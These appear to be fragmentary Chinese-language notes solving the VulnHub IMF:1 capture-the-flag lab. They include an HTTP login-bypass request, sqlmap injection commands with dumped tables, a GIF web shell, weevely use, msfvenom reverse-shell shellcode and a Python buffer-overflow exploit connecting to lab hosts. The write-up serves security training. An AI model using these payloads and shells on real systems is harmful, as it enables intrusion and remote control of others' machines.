[https://www.vulnhub.com/entry/imf-1,162/](https://www.vulnhub.com/entry/imf-1,162/)
 
参考资料  
[https://medium.com/@Javiki/imf-1-vulnhub-writteup-759e55107d96](https://medium.com/@Javiki/imf-1-vulnhub-writteup-759e55107d96)
 
[https://www.google.com/search?q=IMF%3A+1+++vulhub&sca_esv=9267af3241730e66&sca_upv=1&ei=5omsZtq1ObGc4-EP2ei80A8&ved=0ahUKEwjawODZ49WHAxUxzjgGHVk0D_oQ4dUDCBA&uact=5&oq=IMF%3A+1+++vulhub&gs_lp=Egxnd3Mtd2l6LXNlcnAiD0lNRjogMSAgIHZ1bGh1YjIHEAAYgAQYDTIIEAAYgAQYogQyCBAAGIAEGKIEMggQABiABBiiBDIIEAAYgAQYogRIkBdQhQVYjBRwAXgBkAEAmAGyAaABtQqqAQMwLjm4AQPIAQD4AQGYAgqgAtEKwgIKEAAYsAMY1gQYR8ICBRAAGIAEwgIEEAAYHsICBhAAGAgYHsICBRAhGKABmAMAiAYBkAYKkgcDMS45oAfhEw&sclient=gws-wiz-serp#fpstate=ive&vld=cid:35c8d8dc,vid:gCNaJhI66mw,st:0](https://www.google.com/search?q=IMF%3A+1+++vulhub&sca_esv=9267af3241730e66&sca_upv=1&ei=5omsZtq1ObGc4-EP2ei80A8&ved=0ahUKEwjawODZ49WHAxUxzjgGHVk0D_oQ4dUDCBA&uact=5&oq=IMF%3A+1+++vulhub&gs_lp=Egxnd3Mtd2l6LXNlcnAiD0lNRjogMSAgIHZ1bGh1YjIHEAAYgAQYDTIIEAAYgAQYogQyCBAAGIAEGKIEMggQABiABBiiBDIIEAAYgAQYogRIkBdQhQVYjBRwAXgBkAEAmAGyAaABtQqqAQMwLjm4AQPIAQD4AQGYAgqgAtEKwgIKEAAYsAMY1gQYR8ICBRAAGIAEwgIEEAAYHsICBhAAGAgYHsICBRAhGKABmAMAiAYBkAYKkgcDMS45oAfhEw&sclient=gws-wiz-serp#fpstate=ive&vld=cid:35c8d8dc,vid:gCNaJhI66mw,st:0)
   

[https://medium.com/@Javiki/imf-1-vulnhub-writteup-759e55107d96](https://medium.com/@Javiki/imf-1-vulnhub-writteup-759e55107d96)
 
[https://g0blin.co.uk/imf-vulnhub-writeup/](https://g0blin.co.uk/imf-vulnhub-writeup/)
 
[https://g0blin.co.uk/imf-vulnhub-writeup/](https://g0blin.co.uk/imf-vulnhub-writeup/)
   

进行base64 解密  
ZmxhZzJ7YVcxbVl  
XUnRhVzVwYzNSeVlYUnZjZz09fQ==  
第一个的位置
 ![[IMF 1 image ee46c48edcbc83e4.png|Exported image]] ![[IMF 1 image d316607e5f543c2f.png|Exported image]]   
使用抓包进行复现或者使用修改网页标签的形式  
数据包  
POST /imfadministrator/ HTTP/1.1  
Host: 192.168.163.147  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 26  
Origin: [http://192.168.163.147](http://192.168.163.147)  
Connection: close  
Referer: [http://192.168.163.147/imfadministrator/](http://192.168.163.147/imfadministrator/)  
Cookie: PHPSESSID=kpdvttn37q7mfc2dfvfvg9bh91  
Upgrade-Insecure-Requests: 1  
Priority: u=0, i
 
user=rmichaels&pass[]=test
   
![[IMF 1 image 95bc4cc35e937b1e.png|Exported image]]  

第二种使用方法：
 ![[IMF 1 image 6b596f72c4b051f1.png|Exported image]]      
识别二维码

![[IMF 1 image d93af8adaba68443.png|Exported image]]  
![[IMF 1 image ff8cde1e56bf6594.png|Exported image]]  
![[IMF 1 image 3aadb4e5ea386011.png|Exported image]]   
第一种：

![[IMF 1 image fd3f0d737c242112.png|Exported image]]   
采用第二种方法

![[IMF 1 image de044030fb3afa3b.png|Exported image]]  

拿到shell之后就是提权 拿到root权限 root权限种类多种 脏牛内核的提权

![[IMF 1 image 3ea455f6f7136b3a.png|Exported image]]  
![[IMF 1 image c9f50fd3cd39ac6e.png|Exported image]]   ![[IMF 1 image c023f8ad3facb712.png|Exported image]]  
![[IMF 1 image ee69be6d997f6298.png|Exported image]]   ![[IMF 1 image 5ccbb742e18c7a4a.png|Exported image]]  

制作攻击代码  
┌──(kali㉿kali)-[~/Desktop/imf]  
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.163.128 LPORT=9001 EXITFUNC=thread -f python -b "x00\0a\x0d\xff"
 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
[-] No arch selected, selecting arch: x86 from the payload  
No badchars present in payload, skipping automatic encoding  
No encoder specified, outputting raw payload  
Payload size: 68 bytes  
Final size of python file: 349 bytes  
buf = b""  
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"  
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"  
buf += b"\x68\xc0\xa8\xa3\x80\x68\x02\x00\x23\x29\x89\xe1"  
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"  
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"  
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
 
攻击代码  
#!/bin/python  
import socket  
import sys
 
host = "192.168.163.147"  
port = 7788
   

buf = b""  
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"  
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"  
buf += b"\x68\xc0\xa8\xa3\x80\x68\x02\x00\x23\x29\x89\xe1"  
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"  
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"  
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
    
shellcode = (buf)  
buffer = b"A"*(168-len(shellcode))  
jmp_address = b"\x63\x85\x04\x08\n"
 
payload = (shellcode + buffer + jmp_address)
 
try:  
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
sock.settimeout(2)  
sock.connect((host,int(port)))  
sock.recv(1024)  
sock.send(b"48093572\n")  
sock.recv(1024)  
sock.send(b"3\n")  
sock.recv(1024)  
sock.send(payload)  
sock.close()  
print(f"[+] payload sent sucessfully!")  
sys.ext()  
except:  
print(f"[!] Connection error!")  
sys.exit()
 
打开新的shell：  
rlwrap nc -nlvp 9001
    
进行攻击

![[IMF 1 image 15887db888fe058d.png|Exported image]]  

修改为shell 重点在进行agent程序的分析 最后拿到root 使用缓冲区溢出的漏洞进行攻击

![[IMF 1 image 545fdb3ca113af0d.png|Exported image]]  
![[IMF 1 image 87b36cec18dffa9d.png|Exported image]]      
攻击文档  
[https://blog.csdn.net/qq_39972370/article/details/135582966](https://blog.csdn.net/qq_39972370/article/details/135582966)
    
ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==  
\<script\>   ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ nmap -sS -sV -T4 -p- 192.168.163.139  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-12-08 06:42 EST  
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 37.20% done; ETC: 06:44 (0:01:13 remaining)  
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 37.41% done; ETC: 06:44 (0:01:12 remaining)  
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 37.62% done; ETC: 06:44 (0:01:11 remaining)  
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 37.81% done; ETC: 06:44 (0:01:12 remaining)  
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 38.02% done; ETC: 06:44 (0:01:12 remaining)  
Nmap scan report for 192.168.163.139  
Host is up (0.00050s latency).  
Not shown: 65534 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
80/tcp open tcpwrapped  
MAC Address: 00:0C:29:87:5A:D5 (VMware)
 
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 88.28 seconds   ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
   

┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ echo -n "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d  
flag2{aW1mYWRtaW5pc3RyYXRvcg==}  
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
  ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ echo -n "aW1mYWRtaW5pc3RyYXRvcg==" |base64 -d  
imfadministrator  
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
   

flag3{Y29udGludWVUT2Ntcw==}\<br /\>Welcome, rmichaels\<br /\>\<a href='cms.php?pagename=home'\>IMF CMS\</a\>
 
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ echo -n "Y29udGludWVUT2Ntcw==" | base64 -d  
continueTOcms  
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
 
sqlmap -o -u "[http://192.168.163.139/imfadministrator/cms.php?pagename=home](http://192.168.163.139/imfadministrator/cms.php?pagename=home)" --cookie="PHPSESSID=4t476lg1ddv9h9q20gh0opkf81" --batch -dbs
   

[06:58:25] [INFO] retrieved: 'sys'  
available databases [5]:  
[*] admin  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] sys
 
[06:58:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.163.139'
 
[*] ending @ 06:58:25 /2025-12-08/
 
sqlmap -o -u "[http://192.168.163.139/imfadministrator/cms.php?pagename=home](http://192.168.163.139/imfadministrator/cms.php?pagename=home)" --cookie="PHPSESSID=4t476lg1ddv9h9q20gh0opkf81" --batch -D admin -tables
 
[06:59:42] [INFO] the back-end DBMS is MySQL  
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)  
web application technology: Apache 2.4.18  
back-end DBMS: MySQL \>= 5.0  
[06:59:42] [INFO] fetching tables for database: 'admin'  
Database: admin  
[1 table]  
+-------+  
| pages |  
+-------+
 
[06:59:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.163.139'
 
[*] ending @ 06:59:42 /2025-12-08/
 
sqlmap -o -u "[http://192.168.163.139/imfadministrator/cms.php?pagename=home](http://192.168.163.139/imfadministrator/cms.php?pagename=home)" --cookie="PHPSESSID=4t476lg1ddv9h9q20gh0opkf81" --batch -D admin -T pages --dump  
Database: admin  
Table: pages  
[4 entries]  
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+  
| id | pagedata | pagename |  
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+  
| 1 | Under Construction. | upload |  
| 2 | Welcome to the IMF Administration. | home |  
| 3 | Training classrooms available. \<br /\>\<img src="./images/whiteboard.jpg"\>\<br /\> Contact us for training. | tutorials-incomplete |  
| 4 | \<h1\>Disavowed List\</h1\>\<img src="./images/redacted.jpg"\>\<br /\>\<ul\>\<li\>*********\</li\>\<li\>****** ******\</li\>\<li\>*******\</li\>\<li\>**** ********\</li\>\</ul\>\<br /\>-Secretary | disavowlist |  
+----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------+
 
[07:00:33] [INFO] table '`admin`.pages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.163.139/dump/admin/pages.csv'  
[07:00:33] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.163.139'
 
[*] ending @ 07:00:33 /2025-12-08/
  ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
 
[http://192.168.163.139/imfadministrator/images/whiteboard.jpg](http://192.168.163.139/imfadministrator/images/whiteboard.jpg)  
[http://192.168.163.139/imfadministrator/images/redacted.jpg](http://192.168.163.139/imfadministrator/images/redacted.jpg)
    
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ wget [http://192.168.163.139/imfadministrator/images/whiteboard.jpg](http://192.168.163.139/imfadministrator/images/whiteboard.jpg)  
--2025-12-08 07:02:57-- [http://192.168.163.139/imfadministrator/images/whiteboard.jpg](http://192.168.163.139/imfadministrator/images/whiteboard.jpg)  
Connecting to 192.168.163.139:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 58816 (57K) [image/jpeg]  
Saving to: ‘whiteboard.jpg’
 
whiteboard.jpg 100%[==============================================================================================\>] 57.44K --.-KB/s in 0s
 
2025-12-08 07:02:57 (609 MB/s) - ‘whiteboard.jpg’ saved [58816/58816]
  ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ ls  
imf.txt whiteboard.jpg   ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
   

flag4{dXBsb2Fkcjk0Mi5waHA=}
 
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ echo -n "dXBsb2Fkcjk0Mi5waHA=" | base64 -d  
uploadr942.php  
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
 
[http://192.168.163.139/imfadministrator/uploadr942.php](http://192.168.163.139/imfadministrator/uploadr942.php)
   

[http://192.168.163.139/imfadministrator/uploads/edccaa98b1df.gif?a=id](http://192.168.163.139/imfadministrator/uploads/edccaa98b1df.gif?a=id)
 
[http://192.168.163.139/imfadministrator/uploads/3d2c28ceac93.gif?a=ls](http://192.168.163.139/imfadministrator/uploads/3d2c28ceac93.gif?a=ls)
 
[http://192.168.163.139/imfadministrator/uploads/3d2c28ceac93.gif?a=cat](http://192.168.163.139/imfadministrator/uploads/3d2c28ceac93.gif?a=cat) flag5_abc123def.txt  
GIF89a flag5{YWdlbnRzZXJ2aWNlcw==}
    
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ echo -n "YWdlbnRzZXJ2aWNlcw==" | base64 -d  
agentservices  
┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
   

┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ weevely generate jesse 111.php  
Generated '111.php' with password 'jesse' of 688 byte size.   ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ ls  
111.php 1.gif imf.txt webshell.gif whiteboard.jpg   ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$ vi 111.php   ┌──(kali㉿kali)-[~/Desktop/pg02/imf]  
└─$
 
[http://192.168.163.139/imfadministrator/uploads/3791ad81b098.gif](http://192.168.163.139/imfadministrator/uploads/3791ad81b098.gif)
    
helloctfos@Hello-CTF:/mnt/c/Users/HelloCTF_OS/Desktop$ weevely [http://192.168.163.139/imfadministrator/uploads/3791ad81b098.gif](http://192.168.163.139/imfadministrator/uploads/3791ad81b098.gif) jesse
 
[+] weevely 4.0.1
 
[+] Target: 192.168.163.139  
[+] Session: /home/helloctfos/.weevely/sessions/192.168.163.139/3791ad81b098_0.session
 
[+] Browse the filesystem or execute commands starts the connection  
[+] to the target. Type :help for more information.
 
weevely\> ls  
3791ad81b098.gif  
3d2c28ceac93.gif  
8cbe1dc3d294.gif  
edccaa98b1df.gif  
flag5_abc123def.txt  
www-data@imf:/var/www/html/imfadministrator/uploads $  
www-data@imf:/var/www/html/imfadministrator/uploads $ cat flag5_abc123def.txt  
flag5{YWdlbnRzZXJ2aWNlcw==}  
www-data@imf:/var/www/html/imfadministrator/uploads $  
   

nc -z 192.168.163.139 7000 8000 9000;